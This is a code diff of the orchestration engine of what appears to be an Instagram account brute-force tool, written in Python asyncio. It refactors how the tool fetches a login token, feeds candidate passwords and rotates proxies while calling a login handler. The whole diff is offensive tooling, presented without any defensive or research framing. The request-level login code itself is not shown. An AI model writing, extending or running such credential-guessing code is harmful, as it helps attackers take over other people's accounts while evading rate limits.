@@ -7,10 +7,11 @@ import asyncio
 import time
 
 from app.lib import exceptions
-from app.lib.utils import AysncExceptionHandler, AsyncTaskManager, auto_logger
+from app.lib.utils import auto_logger
 
-from .attack import Attacker
-from .managers import QueueManager
+from .login import login_handler
+from .tokens import token_handler
+from .managers import TaskManager, QueueManager
 
 
 __all__ = ('Engine', )
@@ -26,6 +27,27 @@ class Engine(object):
         self.config = config
         self.global_stop_event = global_stop_event
         self.queues = QueueManager(proxies={'generated': proxies})
+
+        self.login_handler = login_handler(config, global_stop_event, self.queues)
+        self.token_handler = token_handler(config, global_stop_event, self.queues)
+
+    # Old potentially useful function we want to keep around from old
+    # AsyncTaskManager.
+    async def _handle_exception(self, exc_type, exc_value, tb):
+        import traceback
+        # We want to do request exception handling outsie of the context.
+        # Not sure why this check is necessary?
+        if issubclass(exc_type, exceptions.FatalException):
+            self.log.critical(exc_value, extra=self.log_context(tb))
+            return await self._shutdown()
+
+        elif issubclass(exc_type, exceptions.InstagramAttackException):
+            self.log.error(exc_value, extra=self.log_context(tb))
+            return True
+        else:
+            self.log.error(exc_value, extra=self.log_context(tb))
+            self.log.info(traceback.format_exc())
+            return True
 
     @auto_logger("Populating Passwords")
     async def populate_passwords(self, log):
@@ -61,19 +83,39 @@ class Engine(object):
             else:
                 log.debug('No New Proxies')
 
+    @auto_logger("Attack")
+    async def attack(self, loop, log):
+
+        token = await self.token_handler.fetch()
+        if token is None:
+            raise exceptions.FatalException(
+                "The allowable attempts to retrieve a token did not result in a "
+                "valid response containing a token.  This is most likely do to "
+                "a connection error."
+            )
+
+        # Check if --test was provided, and if so only use one password that is
+        # attached to user object.
+        log.success("Set Token", extra={'token': token})
+
+        # async with AysncExceptionHandler():
+        results = await self.login_handler.login(token)
+        if not results:
+            log.error('Could not authenticate.')
+        self.global_stop_event.set()
+
     @auto_logger('Running')
     async def run(self, loop, log):
 
-        attacker = Attacker(self.config, self.global_stop_event, self.queues)
-
         await self.populate_passwords()
 
-        tasks = [
-            asyncio.create_task(self.pass_on_proxies()),
-            asyncio.create_task(attacker.attack(loop)),
-        ]
+        manager = TaskManager(self.global_stop_event, log=log)
+        manager.add(
+            asyncio.ensure_future(self.pass_on_proxies()),
+            asyncio.ensure_future(self.attack(loop)),
+        )
 
-        async with AsyncTaskManager(self.global_stop_event, log=log, tasks=tasks) as task_manager:
-            async with AysncExceptionHandler(log=log):
-                await asyncio.gather(*tasks, loop=loop)
-                task_manager.stop()
+        while manager.active:
+            await asyncio.gather(*manager.tasks, loop=loop)
+            manager.stop()
+        log.critical('Global Stop Event Stopped')
